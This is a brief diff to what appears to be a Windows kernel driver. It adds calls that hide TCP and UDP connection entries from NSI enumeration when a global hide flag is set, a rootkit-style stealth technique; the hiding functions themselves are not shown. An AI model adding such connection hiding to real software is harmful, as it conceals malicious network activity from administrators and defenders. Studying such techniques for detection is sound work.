@@ -1,4 +1,5 @@
 #include "Nsi.h"
+#include "Hide.h"
 
 
 //http://safe.sh/security/?type=detail&id=1381
@@ -183,11 +184,20 @@ InputBufferLength：不小于0x3C，也不小于0x70。经观察都是0x70。
 
         if (NmrIsEqualNpiModuleId(ModuleId, &NPI_MS_TCP_MODULEID)) {
             EnumTcpTable(NsiParam);
+
+            if (g_IsHide) {
+                HideTcpInfo(NsiParam);
+            }
         }
 
         if (NmrIsEqualNpiModuleId(ModuleId, &NPI_MS_UDP_MODULEID)) {
             EnumUdpTable(NsiParam);
+
+            if (g_IsHide) {
+                HideUdpInfo(NsiParam);
+            }
         }
+
 
 
     } __except (EXCEPTION_EXECUTE_HANDLER) {
